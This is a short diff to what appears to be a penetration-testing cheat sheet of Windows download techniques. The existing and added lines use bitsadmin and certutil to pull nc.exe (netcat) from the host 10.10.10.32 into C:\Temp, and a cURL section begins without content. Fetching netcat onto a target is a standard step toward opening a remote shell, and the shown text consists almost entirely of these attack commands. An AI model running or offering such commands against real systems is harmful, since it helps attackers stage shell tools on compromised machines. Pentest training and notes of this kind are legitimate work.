@@ -3,10 +3,12 @@
 ### 1) Bitsadmin
 
     bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
+    bitsadmin /transfer job http://10.10.10.32/nc.exe C:\temp\nc.exe
 
 ### 2) certutil
 
     certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
+    certutil.exe -urlcache -split -f http://10.10.10.32/nc.exe
 
 ### 3) cURL
 
